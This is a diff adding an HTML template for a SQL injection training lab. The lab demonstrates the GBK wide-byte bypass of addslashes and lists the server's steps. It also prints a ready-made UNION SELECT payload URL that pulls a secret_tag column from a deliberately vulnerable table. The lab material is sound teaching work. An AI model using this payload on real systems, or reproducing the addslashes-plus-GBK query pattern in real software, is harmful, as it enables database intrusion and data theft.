@@ -1,0 +1,43 @@
+{% extends 'base.html' %}
+{% block title %}{{ lab.title }} - FieldLab{% endblock %}
+{% block content %}
+{% include 'sqli/partials/lab_header.html' %}
+<div class="workbench two-col">
+  <section class="console-card">
+    <h2>校史馆资料库（GBK 编码）</h2>
+    <form method="get" action="" class="form-grid">
+      <input type="hidden" name="mode" value="{{ mode }}">
+      <label>关键字
+        <input type="text" name="keyword" value="{{ keyword_raw }}" placeholder="例如 welcome">
+      </label>
+      <button class="button-primary" type="submit">检索</button>
+    </form>
+    <p class="hint">服务端流程：① <code>addslashes(keyword)</code> → ② <code>SET NAMES gbk</code> → ③ 拼接进 SQL。<br>
+      经典 payload（URL 直接构造）：<br>
+      <code>?keyword=%bf%27%20UNION%20SELECT%201,2,secret_tag,4%20FROM%20gbk_legacy_articles--%20-&mode=vuln</code>
+    </p>
+    <p>原始输入：<code>{{ keyword_raw }}</code></p>
+    <p>addslashes 后：<code>{{ keyword_after_slash }}</code></p>
+    {% if error %}<pre class="error-box">{{ error }}</pre>{% endif %}
+  </section>
+  <aside class="info-card">
+    <h2>检索结果</h2>
+    <table class="data-table">
+      <thead><tr><th>id</th><th>keyword</th><th>title</th><th>secret_tag</th></tr></thead>
+      <tbody>
+      {% for r in rows %}
+        <tr>
+          <td>{{ r.article_id if 'article_id' in r else r.get('1', '') }}</td>
+          <td>{{ r.keyword if 'keyword' in r else '' }}</td>
+          <td>{{ r.title if 'title' in r else '' }}</td>
+          <td>{{ r.secret_tag if 'secret_tag' in r else '' }}</td>
+        </tr>
+      {% else %}
+        <tr><td colspan="4">（无匹配）</td></tr>
+      {% endfor %}
+      </tbody>
+    </table>
+  </aside>
+</div>
+{% include 'sqli/partials/hints.html' %}
+{% endblock %}
